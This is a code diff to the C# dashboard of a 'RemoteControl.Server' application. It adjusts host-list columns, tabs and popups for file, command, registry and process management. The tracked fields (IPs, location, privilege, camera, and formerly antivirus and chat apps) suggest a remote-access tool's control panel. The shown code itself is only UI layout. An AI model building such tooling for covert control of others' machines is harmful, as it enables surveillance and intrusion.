@@ -18,6 +18,10 @@ namespace RemoteControl.Server
         private readonly Dictionary<string, Button> dashboardGroupTabs = new Dictionary<string, Button>(StringComparer.OrdinalIgnoreCase);
         private readonly Dictionary<string, string> dashboardSessionGroups = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
         private string activeDashboardGroup = DefaultDashboardGroupName;
+        private const int FileManagerTabIndex = 0;
+        private const int RemoteCommandTabIndex = 1;
+        private const int RegistryTabIndex = 2;
+        private const int ProcessManagerTabIndex = 3;
         private const string DefaultDashboardGroupName = "默认";
 
         private void InitializeHostDashboardLayout()
@@ -27,7 +31,7 @@ namespace RemoteControl.Server
             this.toolStrip2.Visible = false;
             if (topNavigationPanel != null)
             {
-                topNavigationPanel.Visible = false;
+                topNavigationPanel.Visible = true;
             }
 
             this.Text = APP_TITLE;
@@ -65,27 +69,20 @@ namespace RemoteControl.Server
             hostListView.HideSelection = false;
             hostListView.MultiSelect = true;
             hostListView.SmallImageList = hostListImages;
-            hostListView.ContextMenuStrip = contextMenuStripClient;
+            hostListView.ContextMenuStrip = null;
             hostListView.BackColor = Color.White;
-            hostListView.Font = new Font("微软雅黑", 9F);
+            hostListView.Font = new Font("Microsoft YaHei", 9F);
             EnableListViewDoubleBuffer(hostListView);
-            hostListView.Columns.Add("主机名", 110);
-            hostListView.Columns.Add("用户", 150);
-            hostListView.Columns.Add("外网IP", 120);
-            hostListView.Columns.Add("内网IP", 130);
-            hostListView.Columns.Add("位置", 170);
-            hostListView.Columns.Add("系统", 210);
-            hostListView.Columns.Add("权限", 90);
-            hostListView.Columns.Add("摄像头", 80);
-            hostListView.Columns.Add("杀软", 130);
-            hostListView.Columns.Add("QQ", 70);
-            hostListView.Columns.Add("TG", 70);
-            hostListView.Columns.Add("WX", 70);
-            hostListView.Columns.Add("状态", 70);
-            hostListView.Columns.Add("地区", 90);
-            hostListView.Columns.Add("ISP", 120);
-            hostListView.Columns.Add("备注", 110);
-            hostListView.Columns.Add("最后活动", 110);
+            hostListView.Columns.Add("主机名", 120);
+            hostListView.Columns.Add("用户", 130);
+            hostListView.Columns.Add("外网IP", 130);
+            hostListView.Columns.Add("内网IP", 120);
+            hostListView.Columns.Add("位置", 180);
+            hostListView.Columns.Add("系统", 220);
+            hostListView.Columns.Add("权限", 80);
+            hostListView.Columns.Add("摄像头", 70);
+            hostListView.Columns.Add("备注", 120);
+            hostListView.Columns.Add("最后活动", 100);
             hostListView.MouseUp += hostListView_MouseUp;
             hostListView.DoubleClick += hostListView_DoubleClick;
 
@@ -119,7 +116,7 @@ namespace RemoteControl.Server
             dashboardDefaultTab = CreateDashboardTab("默认(0)", delegate { SelectDashboardGroup(DefaultDashboardGroupName); });
             dashboardDefaultTab.Tag = DefaultDashboardGroupName;
             dashboardTabsPanel.Controls.Add(dashboardDefaultTab);
-            dashboardTabsPanel.Controls.Add(CreateDashboardTab("设置", delegate { toolStripButtonSettings_Click(this, EventArgs.Empty); }));
+            dashboardTabsPanel.Controls.Add(CreateDashboardTab("设置", delegate { ShowSettingsPanel(); }));
             dashboardPluginTab = CreateDashboardTab("插件", delegate { ShowPluginDashboardNotice(); });
             dashboardTabsPanel.Controls.Add(dashboardPluginTab);
 
@@ -139,7 +136,7 @@ namespace RemoteControl.Server
             button.FlatAppearance.BorderSize = 1;
             button.FlatAppearance.BorderColor = Color.FromArgb(210, 210, 210);
             button.BackColor = Color.White;
-            button.Font = new Font("微软雅黑", 9F);
+            button.Font = new Font("Microsoft YaHei", 9F);
             button.Click += click;
             return button;
         }
@@ -149,15 +146,22 @@ namespace RemoteControl.Server
             if (dashboardPanel == null)
                 return;
 
+            HideSettingsPanel();
             this.tabControl1.Visible = false;
             dashboardPanel.Visible = true;
             dashboardPanel.BringToFront();
             RefreshHostDashboard();
         }
 
+        private void ShowTabFeature(int tabIndex)
+        {
+            // 所有功能以独立弹窗方式打开，不再内嵌到TabControl
+            ShowWorkspacePopup(tabIndex);
+        }
+
         private void ShowWorkspacePage(int pageIndex)
         {
-            ShowWorkspacePopup(pageIndex);
+            ShowTabFeature(pageIndex);
         }
     }
 }
